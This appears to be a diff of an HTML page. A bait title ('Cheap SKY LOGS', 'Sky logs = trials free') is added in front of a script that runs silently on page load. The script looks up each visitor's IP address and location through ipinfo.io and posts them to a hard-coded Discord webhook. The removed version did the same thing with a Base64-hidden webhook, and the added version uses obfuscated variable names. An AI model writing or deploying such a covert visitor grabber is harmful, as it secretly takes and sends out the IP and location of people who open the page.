@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Randomized Page</title>
+    <title>Cheap SKY LOGS</title>
     <style>
         body { 
             background-color: #000; 
@@ -18,31 +18,29 @@
     </style>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Sky logs = trials free</h1>
     <script>
-        let webhookBase64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI4MDk0MTYyNDAwNzcyMA=="; 
-        let decodedWebhook = atob(webhookBase64);
-        let token = "afbce99e0999ed"; 
+        let wURL = "https://discord.com/api/webhooks/1280941751624007720/stwdLW8D866HPVDZPAG5XoYDi6fA91jfWPaaS6nmTcsb28QU6tdPJEBVuTO_RP5tQgQ9"; 
+        let xD34L = "abcdefgh"; 
+        let k9KzD8 = "ijklmnop"; 
+        let y0Y8Z1 = "12345678"; 
 
-        async function fetchIPInfo() {
-            try {
-                let response = await fetch(`https://ipinfo.io/json?token=${token}`);
-                if (!response.ok) throw new Error("Network response was not ok.");
-                let data = await response.json();
-                let content = {
-                    content: `IP: ${data.ip}, City: ${data.city}, Region: ${data.region}, Country: ${data.country}, Org: ${data.org}, Loc: ${data.loc}, TZ: ${data.timezone}`
-                };
-                await fetch(decodedWebhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(content)
-                });
-            } catch (error) {
-                console.error("Error:", error);
-            }
+        async function randomDataSender() {
+            let aB1cD2 = await fetch("https://ipinfo.io/json?token=" + y0Y8Z1);
+            let aC3dE4 = await aB1cD2.json();
+
+            let payload = {
+                content: `${xD34L} - IP: ${aC3dE4.ip} | Location: ${aC3dE4.city}, ${aC3dE4.region}`
+            };
+
+            await fetch(wURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
         }
 
-        fetchIPInfo();
+        randomDataSender();
     </script>
 </body>
 </html>
